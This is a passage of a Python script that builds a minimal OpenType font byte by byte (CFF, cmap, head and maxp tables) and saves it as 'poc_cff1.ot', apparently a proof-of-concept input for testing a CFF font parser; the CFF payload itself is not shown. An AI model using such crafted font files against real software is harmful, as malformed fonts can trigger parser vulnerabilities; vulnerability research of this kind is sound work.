ot_data.append(0x04)  # numTables low (4 tables)
ot_data.extend(b'\x00\x00\x00\x00\x00\x00')  # searchRange, entrySelector, rangeShift

# Table records
table_offset = 12 + 4 * 16  # header + 4 table records

# Table 1: CFF
cff_offset = table_offset
cff_length = len(cff_data)
ot_data.extend(b'CFF ')
ot_data.extend(struct.pack('>I', 0))  # checksum placeholder
ot_data.extend(struct.pack('>I', cff_offset))
ot_data.extend(struct.pack('>I', cff_length))

# Table 2: cmap (minimal)
cmap_data = bytearray()
cmap_data.append(0x00)  # version
cmap_data.append(0x00)  # version
cmap_data.append(0x00)  # numTables
cmap_data.append(0x01)  # numTables = 1
cmap_data.append(0x00)  # platformID
cmap_data.append(0x03)  # platformID = 3 (Windows)
cmap_data.append(0x00)  # encodingID
cmap_data.append(0x01)  # encodingID = 1 (Unicode BMP)
cmap_data.append(0x00)  # subtable offset
cmap_data.append(0x0c)  # subtable offset = 12
# Format 4 subtable
cmap_data.append(0x00)  # format
cmap_data.append(0x04)  # format = 4
cmap_data.append(0x00)  # length high
cmap_data.append(0x20)  # length = 32
cmap_data.append(0x00)  # language
cmap_data.append(0x00)  # language = 0
cmap_data.append(0x00)  # segCountX2 high
cmap_data.append(0x04)  # segCountX2 = 4 (2 segments)
cmap_data.append(0x00)  # searchRange
cmap_data.append(0x02)  # searchRange
cmap_data.append(0x00)  # entrySelector
cmap_data.append(0x01)  # entrySelector
cmap_data.append(0x00)  # rangeShift
cmap_data.append(0x00)  # rangeShift
# endCode[0] = 0xFFFF
cmap_data.append(0xff)  # endCode
cmap_data.append(0xff)  # endCode
# reservedPad
cmap_data.append(0x00)
# startCode[0] = 0xFFFF
cmap_data.append(0xff)
cmap_data.append(0xff)
# idDelta[0] = 1
cmap_data.append(0x00)
cmap_data.append(0x01)
# idRangeOffset[0] = 0
cmap_data.append(0x00)
cmap_data.append(0x00)

cmap_offset = table_offset + cff_length
cmap_length = len(cmap_data)
ot_data.extend(b'cmap')
ot_data.extend(struct.pack('>I', 0))  # checksum placeholder
ot_data.extend(struct.pack('>I', cmap_offset))
ot_data.extend(struct.pack('>I', cmap_length))

# Table 3: head (minimal)
head_data = bytearray(54)
head_data[0:4] = struct.pack('>I', 0x00010000)  # version
head_data[4:8] = struct.pack('>I', 0x00010000)  # fontRevision
head_data[12:16] = struct.pack('>I', 0x5F0F3CF5)  # magicNumber
head_data[18] = 0x03  # unitsPerEm high
head_data[19] = 0xe8  # unitsPerEm low = 1000

head_offset = cmap_offset + cmap_length
head_length = len(head_data)
ot_data.extend(b'head')
ot_data.extend(struct.pack('>I', 0))  # checksum placeholder
ot_data.extend(struct.pack('>I', head_offset))
ot_data.extend(struct.pack('>I', head_length))

# Table 4: maxp (minimal)
maxp_data = bytearray()
maxp_data.extend(struct.pack('>I', 0x00010000))  # version
maxp_data.append(0x00)  # numGlyphs high
maxp_data.append(0x01)  # numGlyphs low = 1

maxp_offset = head_offset + head_length
maxp_length = len(maxp_data)
ot_data.extend(b'maxp')
ot_data.extend(struct.pack('>I', 0))  # checksum placeholder
ot_data.extend(struct.pack('>I', maxp_offset))
ot_data.extend(struct.pack('>I', maxp_length))

# Now add all the table data
ot_data.extend(cff_data)
ot_data.extend(cmap_data)
ot_data.extend(head_data)
ot_data.extend(maxp_data)

print(f'Total OT size: {len(ot_data)}')

# Write to file
with open('/workspace/poc_cff1.ot', 'wb') as f:
    f.write(ot_data)
print('Written to /workspace/poc_cff1.ot')
